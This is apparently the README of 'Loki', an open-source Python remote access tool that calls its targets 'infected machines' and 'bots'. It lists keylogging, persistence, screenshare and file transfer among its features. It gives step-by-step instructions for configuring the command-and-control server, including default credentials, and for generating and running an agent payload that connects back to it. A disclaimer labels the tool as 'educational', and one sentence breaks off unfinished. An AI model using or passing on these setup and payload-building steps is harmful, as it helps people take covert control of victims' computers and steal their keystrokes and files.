# Loki

Loki is a simple **R**emote **A**ccess **T**ool.<br/>
Loki uses **RSA-2048** with **AES-256** to keep your communication with infected machines secure.<br/>

[![Version](https://img.shields.io/badge/Version-v0.1.1-blue)]()
[![Python](https://img.shields.io/badge/Python-v3.6%2B-blue)]()
[![Discord](https://img.shields.io/badge/Discord-server-blue)](https://discord.gg/VYRAZg5)
[![Donate](https://img.shields.io/badge/PayPal-Donate-orange.svg)](https://www.paypal.me/Msheikh03)
<br/><br/>

<img src="Screenshots/bots.png" atl=""/>

### Disclaimer

```
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

Loki, just like all my other repos is stricly for **educational** purposes.

### Requirements

-   Python **3.6.x** | **3.7.x** | **3.8.x**

### Server tested on

-   Windows 10
-   Kali Linux

### Bot tested on

-   Windows 10

### Payload generator tested on

-   Windows 10

### Features

-   Upload & Download
-   Chrome Launching
-   Persistence
-   Screenshare
-   Screenshot
-   Keylogger
-   SFTP
-   SSH

### Video from OG dev (enjoy the music!)

https://www.youtube.com/watch?v=UTfZlXGoJ5Y

### Installation

I reccommend you setup a new anaconda virtual environment for package management.

```shell
conda create --name botnet python=3.7
conda activate botnet
```

Once the env is activated (or if you like living recklessly and don't create a dedicated environment) you can install the necessary packages referencing the `requirements.txt`:

```shell
pip install -r requirements.txt
```

### Server side

1. Open `/lib/const.py` & configure your private and public IP's
2. Start loki.py
3. Navigate to http://localhost:5000
4. Login

    ```
    Username: loki
    Password: ikol
    ```

5. Start the server on the same IP as your private IP

### Generate a payload

Navigate to agent directory and run the following command to check all command line parameters `builder.py` accepts. 

```shell
python builder.py -h
```

Run the below to generate a standard agent.

```shell
python builder.py -i 127.0.0.1 -p 8080 -n testagent
```

**While not verified, it's likely the codebase will not compile inside a virtual environment**

Now, once the stager is generated (named `testagent`), move to the `output` directory and run the executable. 

```shell
cd output
./testagent
```

This will generate the agent payload, `testagent_`, in the same output directory. You'll likely need to change the permissions on the payload, so run the following:

```shell
chmod 754 testagent_
./testagent_
```

After a moment or two of waiting, you should see your 

### After connection

-   You can click the id of the bot once it connects

### FYI

-   The bot will call the server using the Public IP, not the private IP
-   The bot will call the server using the port specified on the server tab
